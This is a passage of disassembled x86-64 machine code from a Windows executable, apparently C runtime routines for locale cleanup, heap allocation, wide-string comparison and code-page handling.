   1400063a8:	72 f2                	jb     0x14000639c
   1400063aa:	8d 41 ed             	lea    -0x13(%rcx),%eax
   1400063ad:	83 f8 11             	cmp    $0x11,%eax
   1400063b0:	77 06                	ja     0x1400063b8
   1400063b2:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400063b7:	c3                   	ret
   1400063b8:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   1400063be:	b8 16 00 00 00       	mov    $0x16,%eax
   1400063c3:	83 f9 0e             	cmp    $0xe,%ecx
   1400063c6:	41 0f 46 c0          	cmovbe %r8d,%eax
   1400063ca:	c3                   	ret
   1400063cb:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   1400063d0:	c3                   	ret
   1400063d1:	cc                   	int3
   1400063d2:	cc                   	int3
   1400063d3:	cc                   	int3
   1400063d4:	40 53                	rex push %rbx
   1400063d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400063da:	33 db                	xor    %ebx,%ebx
   1400063dc:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1400063e0:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   1400063e7:	00 00 
   1400063e9:	48 8b 48 20          	mov    0x20(%rax),%rcx
   1400063ed:	39 59 08             	cmp    %ebx,0x8(%rcx)
   1400063f0:	7c 11                	jl     0x140006403
   1400063f2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400063f7:	e8 3c dd ff ff       	call   0x140004138
   1400063fc:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   140006401:	74 05                	je     0x140006408
   140006403:	bb 01 00 00 00       	mov    $0x1,%ebx
   140006408:	8b c3                	mov    %ebx,%eax
   14000640a:	48 83 c4 20          	add    $0x20,%rsp
   14000640e:	5b                   	pop    %rbx
   14000640f:	c3                   	ret
   140006410:	48 85 c9             	test   %rcx,%rcx
   140006413:	0f 84 00 01 00 00    	je     0x140006519
   140006419:	53                   	push   %rbx
   14000641a:	48 83 ec 20          	sub    $0x20,%rsp
   14000641e:	48 8b d9             	mov    %rcx,%rbx
   140006421:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140006425:	48 3b 0d 1c 14 01 00 	cmp    0x1141c(%rip),%rcx        # 0x140017848
   14000642c:	74 05                	je     0x140006433
   14000642e:	e8 a1 f3 ff ff       	call   0x1400057d4
   140006433:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140006437:	48 3b 0d 12 14 01 00 	cmp    0x11412(%rip),%rcx        # 0x140017850
   14000643e:	74 05                	je     0x140006445
   140006440:	e8 8f f3 ff ff       	call   0x1400057d4
   140006445:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140006449:	48 3b 0d 08 14 01 00 	cmp    0x11408(%rip),%rcx        # 0x140017858
   140006450:	74 05                	je     0x140006457
   140006452:	e8 7d f3 ff ff       	call   0x1400057d4
   140006457:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000645b:	48 3b 0d fe 13 01 00 	cmp    0x113fe(%rip),%rcx        # 0x140017860
   140006462:	74 05                	je     0x140006469
   140006464:	e8 6b f3 ff ff       	call   0x1400057d4
   140006469:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   14000646d:	48 3b 0d f4 13 01 00 	cmp    0x113f4(%rip),%rcx        # 0x140017868
   140006474:	74 05                	je     0x14000647b
   140006476:	e8 59 f3 ff ff       	call   0x1400057d4
   14000647b:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000647f:	48 3b 0d ea 13 01 00 	cmp    0x113ea(%rip),%rcx        # 0x140017870
   140006486:	74 05                	je     0x14000648d
   140006488:	e8 47 f3 ff ff       	call   0x1400057d4
   14000648d:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140006491:	48 3b 0d e0 13 01 00 	cmp    0x113e0(%rip),%rcx        # 0x140017878
   140006498:	74 05                	je     0x14000649f
   14000649a:	e8 35 f3 ff ff       	call   0x1400057d4
   14000649f:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   1400064a3:	48 3b 0d ee 13 01 00 	cmp    0x113ee(%rip),%rcx        # 0x140017898
   1400064aa:	74 05                	je     0x1400064b1
   1400064ac:	e8 23 f3 ff ff       	call   0x1400057d4
   1400064b1:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   1400064b5:	48 3b 0d e4 13 01 00 	cmp    0x113e4(%rip),%rcx        # 0x1400178a0
   1400064bc:	74 05                	je     0x1400064c3
   1400064be:	e8 11 f3 ff ff       	call   0x1400057d4
   1400064c3:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   1400064c7:	48 3b 0d da 13 01 00 	cmp    0x113da(%rip),%rcx        # 0x1400178a8
   1400064ce:	74 05                	je     0x1400064d5
   1400064d0:	e8 ff f2 ff ff       	call   0x1400057d4
   1400064d5:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400064dc:	48 3b 0d cd 13 01 00 	cmp    0x113cd(%rip),%rcx        # 0x1400178b0
   1400064e3:	74 05                	je     0x1400064ea
   1400064e5:	e8 ea f2 ff ff       	call   0x1400057d4
   1400064ea:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   1400064f1:	48 3b 0d c0 13 01 00 	cmp    0x113c0(%rip),%rcx        # 0x1400178b8
   1400064f8:	74 05                	je     0x1400064ff
   1400064fa:	e8 d5 f2 ff ff       	call   0x1400057d4
   1400064ff:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   140006506:	48 3b 0d b3 13 01 00 	cmp    0x113b3(%rip),%rcx        # 0x1400178c0
   14000650d:	74 05                	je     0x140006514
   14000650f:	e8 c0 f2 ff ff       	call   0x1400057d4
   140006514:	48 83 c4 20          	add    $0x20,%rsp
   140006518:	5b                   	pop    %rbx
   140006519:	c3                   	ret
   14000651a:	cc                   	int3
   14000651b:	cc                   	int3
   14000651c:	48 85 c9             	test   %rcx,%rcx
   14000651f:	74 66                	je     0x140006587
   140006521:	53                   	push   %rbx
   140006522:	48 83 ec 20          	sub    $0x20,%rsp
   140006526:	48 8b d9             	mov    %rcx,%rbx
   140006529:	48 8b 09             	mov    (%rcx),%rcx
   14000652c:	48 3b 0d fd 12 01 00 	cmp    0x112fd(%rip),%rcx        # 0x140017830
   140006533:	74 05                	je     0x14000653a
   140006535:	e8 9a f2 ff ff       	call   0x1400057d4
   14000653a:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000653e:	48 3b 0d f3 12 01 00 	cmp    0x112f3(%rip),%rcx        # 0x140017838
   140006545:	74 05                	je     0x14000654c
   140006547:	e8 88 f2 ff ff       	call   0x1400057d4
   14000654c:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140006550:	48 3b 0d e9 12 01 00 	cmp    0x112e9(%rip),%rcx        # 0x140017840
   140006557:	74 05                	je     0x14000655e
   140006559:	e8 76 f2 ff ff       	call   0x1400057d4
   14000655e:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140006562:	48 3b 0d 1f 13 01 00 	cmp    0x1131f(%rip),%rcx        # 0x140017888
   140006569:	74 05                	je     0x140006570
   14000656b:	e8 64 f2 ff ff       	call   0x1400057d4
   140006570:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   140006574:	48 3b 0d 15 13 01 00 	cmp    0x11315(%rip),%rcx        # 0x140017890
   14000657b:	74 05                	je     0x140006582
   14000657d:	e8 52 f2 ff ff       	call   0x1400057d4
   140006582:	48 83 c4 20          	add    $0x20,%rsp
   140006586:	5b                   	pop    %rbx
   140006587:	c3                   	ret
   140006588:	48 85 c9             	test   %rcx,%rcx
   14000658b:	0f 84 fe 00 00 00    	je     0x14000668f
   140006591:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006596:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000659b:	56                   	push   %rsi
   14000659c:	48 83 ec 20          	sub    $0x20,%rsp
   1400065a0:	bd 07 00 00 00       	mov    $0x7,%ebp
   1400065a5:	48 8b d9             	mov    %rcx,%rbx
   1400065a8:	8b d5                	mov    %ebp,%edx
   1400065aa:	e8 e1 00 00 00       	call   0x140006690
   1400065af:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   1400065b3:	8b d5                	mov    %ebp,%edx
   1400065b5:	e8 d6 00 00 00       	call   0x140006690
   1400065ba:	8d 75 05             	lea    0x5(%rbp),%esi
   1400065bd:	8b d6                	mov    %esi,%edx
   1400065bf:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   1400065c3:	e8 c8 00 00 00       	call   0x140006690
   1400065c8:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   1400065cf:	8b d6                	mov    %esi,%edx
   1400065d1:	e8 ba 00 00 00       	call   0x140006690
   1400065d6:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   1400065dd:	8d 55 fb             	lea    -0x5(%rbp),%edx
   1400065e0:	e8 ab 00 00 00       	call   0x140006690
   1400065e5:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   1400065ec:	e8 e3 f1 ff ff       	call   0x1400057d4
   1400065f1:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   1400065f8:	e8 d7 f1 ff ff       	call   0x1400057d4
   1400065fd:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   140006604:	e8 cb f1 ff ff       	call   0x1400057d4
   140006609:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   140006610:	8b d5                	mov    %ebp,%edx
   140006612:	e8 79 00 00 00       	call   0x140006690
   140006617:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   14000661e:	8b d5                	mov    %ebp,%edx
   140006620:	e8 6b 00 00 00       	call   0x140006690
   140006625:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   14000662c:	8b d6                	mov    %esi,%edx
   14000662e:	e8 5d 00 00 00       	call   0x140006690
   140006633:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   14000663a:	8b d6                	mov    %esi,%edx
   14000663c:	e8 4f 00 00 00       	call   0x140006690
   140006641:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   140006648:	8d 55 fb             	lea    -0x5(%rbp),%edx
   14000664b:	e8 40 00 00 00       	call   0x140006690
   140006650:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   140006657:	e8 78 f1 ff ff       	call   0x1400057d4
   14000665c:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   140006663:	e8 6c f1 ff ff       	call   0x1400057d4
   140006668:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   14000666f:	e8 60 f1 ff ff       	call   0x1400057d4
   140006674:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   14000667b:	e8 54 f1 ff ff       	call   0x1400057d4
   140006680:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006685:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000668a:	48 83 c4 20          	add    $0x20,%rsp
   14000668e:	5e                   	pop    %rsi
   14000668f:	c3                   	ret
   140006690:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006695:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000669a:	57                   	push   %rdi
   14000669b:	48 83 ec 20          	sub    $0x20,%rsp
   14000669f:	33 ff                	xor    %edi,%edi
   1400066a1:	48 8d 04 d1          	lea    (%rcx,%rdx,8),%rax
   1400066a5:	48 8b d9             	mov    %rcx,%rbx
   1400066a8:	48 8b f2             	mov    %rdx,%rsi
   1400066ab:	48 b9 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rcx
   1400066b2:	ff ff 1f 
   1400066b5:	48 23 f1             	and    %rcx,%rsi
   1400066b8:	48 3b d8             	cmp    %rax,%rbx
   1400066bb:	48 0f 47 f7          	cmova  %rdi,%rsi
   1400066bf:	48 85 f6             	test   %rsi,%rsi
   1400066c2:	74 14                	je     0x1400066d8
   1400066c4:	48 8b 0b             	mov    (%rbx),%rcx
   1400066c7:	e8 08 f1 ff ff       	call   0x1400057d4
   1400066cc:	48 ff c7             	inc    %rdi
   1400066cf:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   1400066d3:	48 3b fe             	cmp    %rsi,%rdi
   1400066d6:	75 ec                	jne    0x1400066c4
   1400066d8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400066dd:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400066e2:	48 83 c4 20          	add    $0x20,%rsp
   1400066e6:	5f                   	pop    %rdi
   1400066e7:	c3                   	ret
   1400066e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400066ec:	e8 af dd ff ff       	call   0x1400044a0
   1400066f1:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400066f6:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   1400066fd:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140006702:	48 8b c8             	mov    %rax,%rcx
   140006705:	e8 fe 2c 00 00       	call   0x140009408
   14000670a:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000670f:	48 8b 00             	mov    (%rax),%rax
   140006712:	48 83 c4 28          	add    $0x28,%rsp
   140006716:	c3                   	ret
   140006717:	cc                   	int3
   140006718:	40 53                	rex push %rbx
   14000671a:	48 83 ec 20          	sub    $0x20,%rsp
   14000671e:	4c 8b c2             	mov    %rdx,%r8
   140006721:	48 8b d9             	mov    %rcx,%rbx
   140006724:	48 85 c9             	test   %rcx,%rcx
   140006727:	74 0e                	je     0x140006737
   140006729:	33 d2                	xor    %edx,%edx
   14000672b:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000672f:	48 f7 f3             	div    %rbx
   140006732:	49 3b c0             	cmp    %r8,%rax
   140006735:	72 43                	jb     0x14000677a
   140006737:	49 0f af d8          	imul   %r8,%rbx
   14000673b:	b8 01 00 00 00       	mov    $0x1,%eax
   140006740:	48 85 db             	test   %rbx,%rbx
   140006743:	48 0f 44 d8          	cmove  %rax,%rbx
   140006747:	eb 15                	jmp    0x14000675e
   140006749:	e8 56 d1 ff ff       	call   0x1400038a4
   14000674e:	85 c0                	test   %eax,%eax
   140006750:	74 28                	je     0x14000677a
   140006752:	48 8b cb             	mov    %rbx,%rcx
   140006755:	e8 f2 f3 ff ff       	call   0x140005b4c
   14000675a:	85 c0                	test   %eax,%eax
   14000675c:	74 1c                	je     0x14000677a
   14000675e:	48 8b 0d 83 1f 01 00 	mov    0x11f83(%rip),%rcx        # 0x1400186e8
   140006765:	4c 8b c3             	mov    %rbx,%r8
   140006768:	ba 08 00 00 00       	mov    $0x8,%edx
   14000676d:	ff 15 ed f0 00 00    	call   *0xf0ed(%rip)        # 0x140015860
   140006773:	48 85 c0             	test   %rax,%rax
   140006776:	74 d1                	je     0x140006749
   140006778:	eb 0d                	jmp    0x140006787
   14000677a:	e8 7d fb ff ff       	call   0x1400062fc
   14000677f:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140006785:	33 c0                	xor    %eax,%eax
   140006787:	48 83 c4 20          	add    $0x20,%rsp
   14000678b:	5b                   	pop    %rbx
   14000678c:	c3                   	ret
   14000678d:	cc                   	int3
   14000678e:	cc                   	int3
   14000678f:	cc                   	int3
   140006790:	40 53                	rex push %rbx
   140006792:	48 83 ec 20          	sub    $0x20,%rsp
   140006796:	48 8b d9             	mov    %rcx,%rbx
   140006799:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   14000679d:	77 3c                	ja     0x1400067db
   14000679f:	48 85 c9             	test   %rcx,%rcx
   1400067a2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400067a7:	48 0f 44 d8          	cmove  %rax,%rbx
   1400067ab:	eb 15                	jmp    0x1400067c2
   1400067ad:	e8 f2 d0 ff ff       	call   0x1400038a4
   1400067b2:	85 c0                	test   %eax,%eax
   1400067b4:	74 25                	je     0x1400067db
   1400067b6:	48 8b cb             	mov    %rbx,%rcx
   1400067b9:	e8 8e f3 ff ff       	call   0x140005b4c
   1400067be:	85 c0                	test   %eax,%eax
   1400067c0:	74 19                	je     0x1400067db
   1400067c2:	48 8b 0d 1f 1f 01 00 	mov    0x11f1f(%rip),%rcx        # 0x1400186e8
   1400067c9:	4c 8b c3             	mov    %rbx,%r8
   1400067cc:	33 d2                	xor    %edx,%edx
   1400067ce:	ff 15 8c f0 00 00    	call   *0xf08c(%rip)        # 0x140015860
   1400067d4:	48 85 c0             	test   %rax,%rax
   1400067d7:	74 d4                	je     0x1400067ad
   1400067d9:	eb 0d                	jmp    0x1400067e8
   1400067db:	e8 1c fb ff ff       	call   0x1400062fc
   1400067e0:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400067e6:	33 c0                	xor    %eax,%eax
   1400067e8:	48 83 c4 20          	add    $0x20,%rsp
   1400067ec:	5b                   	pop    %rbx
   1400067ed:	c3                   	ret
   1400067ee:	cc                   	int3
   1400067ef:	cc                   	int3
   1400067f0:	4d 85 c0             	test   %r8,%r8
   1400067f3:	75 18                	jne    0x14000680d
   1400067f5:	33 c0                	xor    %eax,%eax
   1400067f7:	c3                   	ret
   1400067f8:	0f b7 01             	movzwl (%rcx),%eax
   1400067fb:	66 85 c0             	test   %ax,%ax
   1400067fe:	74 13                	je     0x140006813
   140006800:	66 3b 02             	cmp    (%rdx),%ax
   140006803:	75 0e                	jne    0x140006813
   140006805:	48 83 c1 02          	add    $0x2,%rcx
   140006809:	48 83 c2 02          	add    $0x2,%rdx
   14000680d:	49 83 e8 01          	sub    $0x1,%r8
   140006811:	75 e5                	jne    0x1400067f8
   140006813:	0f b7 01             	movzwl (%rcx),%eax
   140006816:	0f b7 0a             	movzwl (%rdx),%ecx
   140006819:	2b c1                	sub    %ecx,%eax
   14000681b:	c3                   	ret
   14000681c:	40 55                	rex push %rbp
   14000681e:	41 54                	push   %r12
   140006820:	41 55                	push   %r13
   140006822:	41 56                	push   %r14
   140006824:	41 57                	push   %r15
   140006826:	48 83 ec 60          	sub    $0x60,%rsp
   14000682a:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000682f:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   140006833:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   140006837:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   14000683b:	48 8b 05 f6 07 01 00 	mov    0x107f6(%rip),%rax        # 0x140017038
   140006842:	48 33 c5             	xor    %rbp,%rax
   140006845:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140006849:	44 8b ea             	mov    %edx,%r13d
   14000684c:	45 8b f9             	mov    %r9d,%r15d
   14000684f:	48 8b d1             	mov    %rcx,%rdx
   140006852:	4d 8b e0             	mov    %r8,%r12
   140006855:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140006859:	e8 f6 e4 ff ff       	call   0x140004d54
   14000685e:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   140006864:	85 ff                	test   %edi,%edi
   140006866:	75 07                	jne    0x14000686f
   140006868:	48 8b 45 08          	mov    0x8(%rbp),%rax
   14000686c:	8b 78 0c             	mov    0xc(%rax),%edi
   14000686f:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   140006875:	45 8b cf             	mov    %r15d,%r9d
   140006878:	4d 8b c4             	mov    %r12,%r8
   14000687b:	8b cf                	mov    %edi,%ecx
   14000687d:	1b d2                	sbb    %edx,%edx
   14000687f:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140006884:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000688a:	83 e2 08             	and    $0x8,%edx
   14000688d:	ff c2                	inc    %edx
   14000688f:	e8 18 01 00 00       	call   0x1400069ac
   140006894:	4c 63 f0             	movslq %eax,%r14
   140006897:	85 c0                	test   %eax,%eax
   140006899:	75 07                	jne    0x1400068a2
   14000689b:	33 ff                	xor    %edi,%edi
   14000689d:	e9 ce 00 00 00       	jmp    0x140006970
   1400068a2:	49 8b f6             	mov    %r14,%rsi
   1400068a5:	48 03 f6             	add    %rsi,%rsi
   1400068a8:	48 8d 46 10          	lea    0x10(%rsi),%rax
   1400068ac:	48 3b f0             	cmp    %rax,%rsi
   1400068af:	48 1b c9             	sbb    %rcx,%rcx
   1400068b2:	48 23 c8             	and    %rax,%rcx
   1400068b5:	74 53                	je     0x14000690a
   1400068b7:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   1400068be:	77 31                	ja     0x1400068f1
   1400068c0:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   1400068c4:	48 3b c1             	cmp    %rcx,%rax
   1400068c7:	77 0a                	ja     0x1400068d3
   1400068c9:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   1400068d0:	ff ff 0f 
   1400068d3:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400068d7:	e8 a4 3a 00 00       	call   0x14000a380
   1400068dc:	48 2b e0             	sub    %rax,%rsp
   1400068df:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   1400068e4:	48 85 db             	test   %rbx,%rbx
   1400068e7:	74 6f                	je     0x140006958
   1400068e9:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   1400068ef:	eb 13                	jmp    0x140006904
   1400068f1:	e8 9a fe ff ff       	call   0x140006790
   1400068f6:	48 8b d8             	mov    %rax,%rbx
   1400068f9:	48 85 c0             	test   %rax,%rax
   1400068fc:	74 0e                	je     0x14000690c
   1400068fe:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140006904:	48 83 c3 10          	add    $0x10,%rbx
   140006908:	eb 02                	jmp    0x14000690c
   14000690a:	33 db                	xor    %ebx,%ebx
   14000690c:	48 85 db             	test   %rbx,%rbx
   14000690f:	74 47                	je     0x140006958
   140006911:	4c 8b c6             	mov    %rsi,%r8
   140006914:	33 d2                	xor    %edx,%edx
   140006916:	48 8b cb             	mov    %rbx,%rcx
   140006919:	e8 12 ba ff ff       	call   0x140002330
   14000691e:	45 8b cf             	mov    %r15d,%r9d
   140006921:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140006926:	4d 8b c4             	mov    %r12,%r8
   140006929:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000692e:	ba 01 00 00 00       	mov    $0x1,%edx
   140006933:	8b cf                	mov    %edi,%ecx
   140006935:	e8 72 00 00 00       	call   0x1400069ac
   14000693a:	85 c0                	test   %eax,%eax
   14000693c:	74 1a                	je     0x140006958
   14000693e:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   140006945:	44 8b c0             	mov    %eax,%r8d
   140006948:	48 8b d3             	mov    %rbx,%rdx
   14000694b:	41 8b cd             	mov    %r13d,%ecx
   14000694e:	ff 15 fc ee 00 00    	call   *0xeefc(%rip)        # 0x140015850
   140006954:	8b f8                	mov    %eax,%edi
   140006956:	eb 02                	jmp    0x14000695a
   140006958:	33 ff                	xor    %edi,%edi
   14000695a:	48 85 db             	test   %rbx,%rbx
   14000695d:	74 11                	je     0x140006970
   14000695f:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   140006963:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   140006969:	75 05                	jne    0x140006970
   14000696b:	e8 64 ee ff ff       	call   0x1400057d4
   140006970:	80 7d 18 00          	cmpb   $0x0,0x18(%rbp)
   140006974:	74 0b                	je     0x140006981
   140006976:	48 8b 45 00          	mov    0x0(%rbp),%rax
   14000697a:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006981:	8b c7                	mov    %edi,%eax
   140006983:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140006987:	48 33 cd             	xor    %rbp,%rcx
   14000698a:	e8 91 a9 ff ff       	call   0x140001320
   14000698f:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   140006993:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   140006997:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   14000699b:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   14000699f:	41 5f                	pop    %r15
   1400069a1:	41 5e                	pop    %r14
   1400069a3:	41 5d                	pop    %r13
   1400069a5:	41 5c                	pop    %r12
   1400069a7:	5d                   	pop    %rbp
   1400069a8:	c3                   	ret
   1400069a9:	cc                   	int3
   1400069aa:	cc                   	int3
   1400069ab:	cc                   	int3
   1400069ac:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   1400069b2:	77 20                	ja     0x1400069d4
   1400069b4:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   1400069ba:	83 f8 09             	cmp    $0x9,%eax
   1400069bd:	77 0c                	ja     0x1400069cb
   1400069bf:	41 ba a7 02 00 00    	mov    $0x2a7,%r10d
   1400069c5:	41 0f a3 c2          	bt     %eax,%r10d
   1400069c9:	72 05                	jb     0x1400069d0
   1400069cb:	83 f9 2a             	cmp    $0x2a,%ecx
   1400069ce:	75 2f                	jne    0x1400069ff
   1400069d0:	33 d2                	xor    %edx,%edx
   1400069d2:	eb 2b                	jmp    0x1400069ff
   1400069d4:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   1400069da:	74 20                	je     0x1400069fc
   1400069dc:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   1400069e2:	76 1b                	jbe    0x1400069ff
   1400069e4:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   1400069ea:	76 e4                	jbe    0x1400069d0
   1400069ec:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   1400069f2:	74 dc                	je     0x1400069d0
   1400069f4:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   1400069fa:	75 03                	jne    0x1400069ff
   1400069fc:	83 e2 08             	and    $0x8,%edx
   1400069ff:	48 ff 25 ba ee 00 00 	rex.W jmp *0xeeba(%rip)        # 0x1400158c0
   140006a06:	cc                   	int3
   140006a07:	cc                   	int3
   140006a08:	f0 ff 41 10          	lock incl 0x10(%rcx)
   140006a0c:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   140006a13:	48 85 c0             	test   %rax,%rax
   140006a16:	74 03                	je     0x140006a1b
   140006a18:	f0 ff 00             	lock incl (%rax)
   140006a1b:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   140006a22:	48 85 c0             	test   %rax,%rax
   140006a25:	74 03                	je     0x140006a2a
   140006a27:	f0 ff 00             	lock incl (%rax)
   140006a2a:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140006a31:	48 85 c0             	test   %rax,%rax
   140006a34:	74 03                	je     0x140006a39
   140006a36:	f0 ff 00             	lock incl (%rax)
   140006a39:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140006a40:	48 85 c0             	test   %rax,%rax
   140006a43:	74 03                	je     0x140006a48
   140006a45:	f0 ff 00             	lock incl (%rax)
   140006a48:	48 8d 41 38          	lea    0x38(%rcx),%rax
   140006a4c:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140006a52:	48 8d 15 bf 0c 01 00 	lea    0x10cbf(%rip),%rdx        # 0x140017718
   140006a59:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140006a5d:	74 0b                	je     0x140006a6a
   140006a5f:	48 8b 10             	mov    (%rax),%rdx
   140006a62:	48 85 d2             	test   %rdx,%rdx
   140006a65:	74 03                	je     0x140006a6a
   140006a67:	f0 ff 02             	lock incl (%rdx)
   140006a6a:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140006a6f:	74 0c                	je     0x140006a7d
   140006a71:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140006a75:	48 85 d2             	test   %rdx,%rdx
   140006a78:	74 03                	je     0x140006a7d
   140006a7a:	f0 ff 02             	lock incl (%rdx)
   140006a7d:	48 83 c0 20          	add    $0x20,%rax
   140006a81:	49 83 e8 01          	sub    $0x1,%r8
   140006a85:	75 cb                	jne    0x140006a52
   140006a87:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   140006a8e:	e9 21 02 00 00       	jmp    0x140006cb4
   140006a93:	cc                   	int3
   140006a94:	48 83 ec 28          	sub    $0x28,%rsp
   140006a98:	48 85 c9             	test   %rcx,%rcx
   140006a9b:	0f 84 96 00 00 00    	je     0x140006b37
   140006aa1:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006aa5:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   140006aaa:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   140006ab1:	48 85 c0             	test   %rax,%rax
   140006ab4:	74 04                	je     0x140006aba
   140006ab6:	f0 44 01 08          	lock add %r9d,(%rax)
   140006aba:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   140006ac1:	48 85 c0             	test   %rax,%rax
   140006ac4:	74 04                	je     0x140006aca
   140006ac6:	f0 44 01 08          	lock add %r9d,(%rax)
   140006aca:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140006ad1:	48 85 c0             	test   %rax,%rax
   140006ad4:	74 04                	je     0x140006ada
   140006ad6:	f0 44 01 08          	lock add %r9d,(%rax)
   140006ada:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140006ae1:	48 85 c0             	test   %rax,%rax
   140006ae4:	74 04                	je     0x140006aea
   140006ae6:	f0 44 01 08          	lock add %r9d,(%rax)
   140006aea:	48 8d 41 38          	lea    0x38(%rcx),%rax
   140006aee:	41 b8 06 00 00 00    	mov    $0x6,%r8d
